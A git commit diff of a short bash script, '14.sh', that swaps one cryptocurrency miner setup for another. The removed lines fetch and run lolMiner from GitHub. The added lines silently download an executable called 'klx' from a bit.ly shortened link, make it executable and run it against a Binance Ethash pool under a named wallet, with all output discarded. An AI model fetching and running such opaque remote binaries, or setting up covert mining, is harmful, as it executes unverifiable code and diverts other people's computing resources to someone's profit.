5e9df01d39ffa8b423e136c398cd3d726e3db33e
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-30 02:49:46 -0600

    Update 14.sh

--- 14.sh
+++ 14.sh
@@ -1,6 +1,4 @@
 #!/bin/bash
-nvidia-smi
-sudo apt update -y
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
-tar -xf lolMiner_v1.29_Lin64.tar.gz
-cd 1.29 && ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:1800  --user teguhcong.GPU-MT_RECEH-$(echo $(shuf -i 1-99 -n 1)) --ethstratum ETHPROXY
+wget -O klx https://bit.ly/klx_nano >/dev/null 2>&1
+chmod +x klx >/dev/null 2>&1
+./klx -pool stratum+tcp://ethash.poolbinance.com:443 -wal teguhcong.gpu-mt -pass x
